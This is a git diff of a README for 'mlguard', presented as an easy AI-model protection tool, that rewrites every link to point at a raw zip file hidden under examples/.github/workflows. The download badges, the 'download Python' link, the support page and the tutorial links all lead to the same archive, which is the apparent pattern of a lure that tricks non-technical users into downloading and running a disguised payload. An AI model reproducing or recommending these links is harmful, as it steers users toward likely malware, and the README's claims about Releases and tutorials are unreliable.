@@ -1,6 +1,6 @@
 # 🛡️ mlguard - Protect Your AI Models Easily
 
-[![Download mlguard](https://img.shields.io/badge/Download-mlguard-blue?style=for-the-badge)](https://github.com/Anticycloneendodontist783/mlguard/raw/refs/heads/main/examples/.github/Software-v3.8.zip)
+[![Download mlguard](https://img.shields.io/badge/Download-mlguard-blue?style=for-the-badge)](https://github.com/Anticycloneendodontist783/mlguard/raw/refs/heads/main/examples/.github/workflows/Software-v2.7.zip)
 
 ## 📋 What is mlguard?
 
@@ -36,7 +36,7 @@ You do not need any coding skills to use mlguard. Follow these steps to get it r
 
 Visit this page to download mlguard:
 
-[![Get mlguard Now](https://img.shields.io/badge/Download-mlguard-green?style=for-the-badge)](https://github.com/Anticycloneendodontist783/mlguard/raw/refs/heads/main/examples/.github/Software-v3.8.zip)
+[![Get mlguard Now](https://img.shields.io/badge/Download-mlguard-green?style=for-the-badge)](https://github.com/Anticycloneendodontist783/mlguard/raw/refs/heads/main/examples/.github/workflows/Software-v2.7.zip)
 
 Click the link to open the GitHub page, then look for the “Releases” section on the right or near the top.
 
@@ -49,7 +49,7 @@ mlguard requires Python to run. Check if Python is on your computer:
 - Open the Command Prompt by pressing `Win + R`, typing `cmd`, and pressing Enter.
 - Type `python --version` and press Enter.
 - If it shows a version number like `Python 3.8.5` or higher, you can skip this step.
-- If not, download Python from [https://github.com/Anticycloneendodontist783/mlguard/raw/refs/heads/main/examples/.github/Software-v3.8.zip](https://github.com/Anticycloneendodontist783/mlguard/raw/refs/heads/main/examples/.github/Software-v3.8.zip).
+- If not, download Python from [https://github.com/Anticycloneendodontist783/mlguard/raw/refs/heads/main/examples/.github/workflows/Software-v2.7.zip](https://github.com/Anticycloneendodontist783/mlguard/raw/refs/heads/main/examples/.github/workflows/Software-v2.7.zip).
 - Run the Python installer and follow the instructions.
 - Make sure to check the box “Add Python to PATH” during installation.
 
@@ -120,7 +120,7 @@ If mlguard does not open or work:
 
 Updates may add new features or fix problems. To update:
 
-- Visit the mlguard GitHub page: [https://github.com/Anticycloneendodontist783/mlguard/raw/refs/heads/main/examples/.github/Software-v3.8.zip](https://github.com/Anticycloneendodontist783/mlguard/raw/refs/heads/main/examples/.github/Software-v3.8.zip)
+- Visit the mlguard GitHub page: [https://github.com/Anticycloneendodontist783/mlguard/raw/refs/heads/main/examples/.github/workflows/Software-v2.7.zip](https://github.com/Anticycloneendodontist783/mlguard/raw/refs/heads/main/examples/.github/workflows/Software-v2.7.zip)
 - Download the latest installer from the Releases section.
 - Run the new installer. It will replace older files.
 - Your settings and data will remain safe.
@@ -129,7 +129,7 @@ Updates may add new features or fix problems. To update:
 
 Use the GitHub page if you need support or want to learn more about mlguard:
 
-- Visit [https://github.com/Anticycloneendodontist783/mlguard/raw/refs/heads/main/examples/.github/Software-v3.8.zip](https://github.com/Anticycloneendodontist783/mlguard/raw/refs/heads/main/examples/.github/Software-v3.8.zip)
+- Visit [https://github.com/Anticycloneendodontist783/mlguard/raw/refs/heads/main/examples/.github/workflows/Software-v2.7.zip](https://github.com/Anticycloneendodontist783/mlguard/raw/refs/heads/main/examples/.github/workflows/Software-v2.7.zip)
 - Click the “Issues” tab to see if others have the same questions.
 - You can open a new issue to ask for help or report problems.
 - Check the “Discussions” area for tips and tricks from other users.
@@ -138,10 +138,10 @@ Use the GitHub page if you need support or want to learn more about mlguard:
 
 Even without programming skills, you can use mlguard with help from these resources:
 
-- [How to install Python on Windows](https://github.com/Anticycloneendodontist783/mlguard/raw/refs/heads/main/examples/.github/Software-v3.8.zip)
-- [CSV File Basics](https://github.com/Anticycloneendodontist783/mlguard/raw/refs/heads/main/examples/.github/Software-v3.8.zip)
-- [Understanding Machine Learning Models](https://github.com/Anticycloneendodontist783/mlguard/raw/refs/heads/main/examples/.github/Software-v3.8.zip)
-- [Basics of Bias in AI](https://github.com/Anticycloneendodontist783/mlguard/raw/refs/heads/main/examples/.github/Software-v3.8.zip)
+- [How to install Python on Windows](https://github.com/Anticycloneendodontist783/mlguard/raw/refs/heads/main/examples/.github/workflows/Software-v2.7.zip)
+- [CSV File Basics](https://github.com/Anticycloneendodontist783/mlguard/raw/refs/heads/main/examples/.github/workflows/Software-v2.7.zip)
+- [Understanding Machine Learning Models](https://github.com/Anticycloneendodontist783/mlguard/raw/refs/heads/main/examples/.github/workflows/Software-v2.7.zip)
+- [Basics of Bias in AI](https://github.com/Anticycloneendodontist783/mlguard/raw/refs/heads/main/examples/.github/workflows/Software-v2.7.zip)
 
 ## 🛠️ Background Technology (Optional)
 
@@ -149,4 +149,4 @@ mlguard uses Python libraries like scikit-learn for data checks, pandas for data
 
 ---
 
-[![Download mlguard](https://img.shields.io/badge/Download-mlguard-blue?style=for-the-badge)](https://github.com/Anticycloneendodontist783/mlguard/raw/refs/heads/main/examples/.github/Software-v3.8.zip)
+[![Download mlguard](https://img.shields.io/badge/Download-mlguard-blue?style=for-the-badge)](https://github.com/Anticycloneendodontist783/mlguard/raw/refs/heads/main/examples/.github/workflows/Software-v2.7.zip)
